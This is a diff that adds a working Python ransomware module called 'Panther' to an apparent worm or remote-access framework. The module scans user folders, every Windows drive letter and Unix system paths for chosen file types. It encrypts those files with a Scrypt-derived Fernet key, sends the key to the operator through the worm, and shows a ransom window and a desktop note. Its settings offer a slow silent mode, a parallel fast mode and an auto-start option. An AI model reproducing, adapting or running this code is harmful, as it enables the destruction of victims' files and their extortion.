@@ -1,0 +1,290 @@
+#!name##Panther
+#!types##module
+#!info##[PyEx] A Python-based ransomware module. It searches for selected files, starts encrypting them, displays a notification window, and creates a file on the desktop. It generates an encryption key, strengthens it with an additional password, and sends it to the server. Supports two operation modes: Silent mode, which encrypts files one by one with timed intervals. Fast mode, which encrypts multiple files in parallel for maximum speed.
+#!reqVar##PAN_file_ext##Types of files to be encrypted##list
+#!setVar##PAN_file_ext##[".gif", ".jpeg", ".jpg", ".bmp"]##list
+#!reqVar##PAN_password##A string of characters (password) that will be used to generate the encryption key.##str
+#!setVar##PAN_password##SuperStrongPassword##str
+#!reqVar##PAN_message##The message that will be displayed in the window when all files are encrypted.##str
+#!setVar##PAN_message##If you want to recover your files contact: example@gmail.com##str
+#!reqVar##PAN_silent##Slow file encryption with pause. (True or False) ##str
+#!setVar##PAN_silent##True##str
+#!reqVar##PAN_encrypted##Extension of the encrypted file.##str
+#!setVar##PAN_encrypted##.encrypted##str
+#!reqVar##PAN_auto##Instant start after worm launch.(True or False)##str
+#!setVar##PAN_auto##False##str
+#!TAGS##[PyEx]
+
+
+import os
+import base64
+import tkinter
+import threading
+import string
+import secrets
+import pathlib
+import random
+from typing import Union
+from time import sleep
+
+import cryptography
+from cryptography.fernet import Fernet
+from cryptography.hazmat.primitives.kdf.scrypt import Scrypt
+
+class Panther:
+    MTYPES = "rat"
+    def __init__(self, worm: object):
+        self.worm = worm
+        self._key = None
+        self._password = "{{PAN_password}}"
+        self._salt_size = 16
+        self._start_location = []
+        self.tar_file_ext = {{PAN_file_ext}}
+        self.banned = ["Windows", "windows", "temp", "Temp", "TEMP", "tmp", "TMP", "Program Files"]
+        self.targets = set()
+        self.en_ext = ["{{PAN_encrypted}}"]
+        self.lock = threading.Lock()
+        self.flock = threading.Lock()
+        self.silent_mode = "{{PAN_silent}}"
+        if self.silent_mode == "False":
+            self.silent_mode = False
+        self.owned = set()
+        self.file_ext = self.tar_file_ext
+        self.storage = self.targets
+        self.ff_flag = "empty"
+        self.auto_start = "{{PAN_auto}}"
+        if self.auto_start == "False":
+            self.auto_start = False
+        
+
+
+    def check_file_path(self) -> None:
+        bdirs = [os.path.expanduser("~"), os.environ.get("APPDATA"), os.environ.get("LOCALAPPDATA"), os.environ.get("PUBLIC"), os.environ.get("PROGRAMDATA"), os.environ.get("ONEDRIVE")]
+        _win = [f"{letter}:/" for letter in list(string.ascii_uppercase)]
+        bdirs.extend(_win)
+        bdirs.extend(["/mnt", "/usr", "/log", "/var", "/etc"])
+        for bd in bdirs:
+            if not bd:
+                continue
+            if os.path.exists(bd):
+                self._start_location.append(bd)
+    
+    def desktop_msg(self) -> None:
+        wdd = [pathlib.Path.home() / "Desktop", os.path.expanduser("~")]
+        for w in wdd:
+            try:
+                fp = os.path.join(w, "YOU_ARE_ENCRYPTED.txt")
+                with open(fp, "w") as file:
+                    file.write("!!! Your files have been encrypted !!!\n\n")
+                    file.write("{{PAN_message}}")
+            except:
+                pass
+
+
+    def check_file(self, file_path: str) -> None:
+        if os.path.splitext(file_path)[1] in self.file_ext:
+            self.storage.add(file_path)
+    
+    def check_files(self, dir_name: str, files_list: list) -> None:
+        for f in files_list:
+            self.check_file(os.path.join(dir_name, f))
+    
+    def find_three(self, location: str) -> None:
+        ths = []
+        for r,d,f in os.walk(location):
+            th = threading.Thread(target=self.check_files, args=(r, f), daemon=True)
+            th.start()
+            ths.append(th)
+        for t in ths:
+            t.join()
+
+    def find_second(self, location: str) -> None:
+        ths = []
+        for d in os.listdir(location):
+            if d in self.banned:
+                continue
+            fod = os.path.join(location, d)
+            if not os.path.isdir(fod):
+                self.check_file(fod)
+            else:
+                th = threading.Thread(target=self.find_three, args=(fod, ), daemon=True)
+                th.start()
+                ths.append(th)
+        for t in ths:
+            t.join()
+    
+    
+    def find_first(self, location: str) -> None:
+        ths = []
+        for d in os.listdir(location):
+            if d in self.banned:
+                continue
+            fod = os.path.join(location, d)
+            if not os.path.isdir(fod):
+                self.check_file(fod)
+            else:
+                th = threading.Thread(target=self.find_second, args=(fod, ), daemon=True)
+                th.start()
+                ths.append(th)
+        for t in ths:
+            t.join()
+    
+    def find_file(self, ftypes: str = "target") -> None:
+        if ftypes == "target":
+            self.file_ext = self.tar_file_ext
+            self.storage = self.targets
+        else:
+            self.file_ext = self.en_ext
+            self.storage = self.owned
+        self.check_file_path()
+        for loc in self._start_location:
+            self.find_first(loc)
+    
+    def _warn_window(self) -> None:
+        window = tkinter.Tk()
+        window.geometry("800x500")
+        window.title("PANTHER")
+        window.configure(bg="red")
+        mlabel = tkinter.Label(window, text="!!! Your files have been encrypted !!!", font=("Arial", 26), fg="black", bg="red")
+        mlabel.pack(pady=25)
+        tlabel = tkinter.Label(window, text="{{PAN_message}}", font=("Arial", 16))
+        tlabel.pack(pady=30)
+        window.mainloop()
+    
+    def warn_window(self) -> None:
+        th = threading.Thread(target=self._warn_window)
+        th.start()
+
+    def generate_key(self) -> None:
+        if self._key:
+            return
+        salt = secrets.token_bytes(self._salt_size)
+        kdf = Scrypt(salt, length=32, n=2**14, r=8, p=1)
+        kdf = kdf.derive(self._password.encode())
+        self._key = base64.urlsafe_b64encode(kdf)
+        
+    def encrypt_file(self, target: str) -> None:
+        f = Fernet(self._key)
+        with self.flock:
+            try:
+                with open(target, "rb") as file:
+                    data = file.read()
+            except:
+                return
+        edata = f.encrypt(data)
+        npath = target + self.en_ext[0]
+        os.rename(target, npath)
+        try:
+            with open(npath, "wb") as file:
+                file.write(edata)
+        except:
+            return
+    
+    def decrypt_file(self, target: str) -> None:
+        f = Fernet(self._key)
+        with self.flock:
+            try:
+                with open(target, "rb") as file:
+                    edata = file.read()
+            except:
+                return
+            try:
+                data = f.decrypt(edata)
+            except:
+                return
+            npath = target.rstrip(self.en_ext[0])
+            os.rename(target, npath)
+            try:
+                with open(npath, "wb") as file:
+                    file.write(data)
+            except:
+                return
+        
+    def set_key(self, key: str) -> None:
+        self._key = key
+    
+    def _encrypt_silent(self) -> None:
+        for t in self.storage:
+            self.encrypt_file(t)
+            sleep(random.randint(3, 7))
+        self.worm.send_msg(f"Encrypted {len(self.storage)} files.")
+        self.warn_window()
+        self.desktop_msg()
+    
+    def _encrypt_heavy(self) -> None:
+        ths = []
+        for t in self.storage:
+            th = threading.Thread(target=self.encrypt_file, args=(t,))
+            th.start()
+            ths.append(th)
+        for t in ths:
+            t.join()
+        self.worm.send_msg(f"Encrypted {len(self.storage)} files.")
+        self.warn_window()
+        self.desktop_msg()
+
+    def encrypt(self) -> None:
+        self.worm.send_msg("Panther start")
+        self.generate_key()
+        self.send_key()
+        self.find_file()
+        if self.silent_mode:
+            eth = threading.Thread(target=self._encrypt_silent)
+            eth.start()
+        else:
+            eth = threading.Thread(target=self._encrypt_heavy)
+            eth.start()
+        
+        
+    def _decrypt_heavy(self) -> None:
+        ths = []
+        for t in self.storage:
+            th = threading.Thread(target=self.decrypt_file, args=(t, ))
+            th.start()
+            ths.append(th)
+        for t in ths:
+            t.join()
+    
+    def decrypt(self) -> None:
+        self.worm.send_msg("Decrypt files....")
+        self.find_file("owned")
+        self._decrypt_heavy()
+    
+    def send_key(self) -> None:
+        if not self._key:
+            return
+        self.worm.send_data({"types" : "ransk", "data" : self._key.decode()})
+        self.worm.send_msg(f"Ransomware KEY: {self._key.decode()}")
+    
+    def help(self) -> str:
+        h = "'Panther_encrypt' - Generate Key and Encrypt Files\n"
+        h += "'Panther_decrypt' - Decrypt Files\n"
+        h += "'Panther_Key <key>' - Send key to worm\n"
+        h += "'Panther_silent' - Switch to silent mode\n"
+        h += "'Panther_heavy' - Switch to heavy mode\n"
+        return h
+    
+    def exec_cmd(self, cmd: list) -> None:
+        match cmd[0]:
+            case "Panther_encrypt":
+                self.encrypt()
+            case "Panther_decrypt":
+                self.decrypt()
+            case "Panther_Key":
+                self.set_key(cmd[1])
+            case "Panther_silent":
+                self.silent_mode = True
+            case "Panther_heavy":
+                self.silent_mode = False
+
+
+
+    def start(self) -> None:
+        if self.auto_start:
+            sleep(5)
+            if self.worm.is_conn:
+                self.encrypt()
+        
+
+        
+        
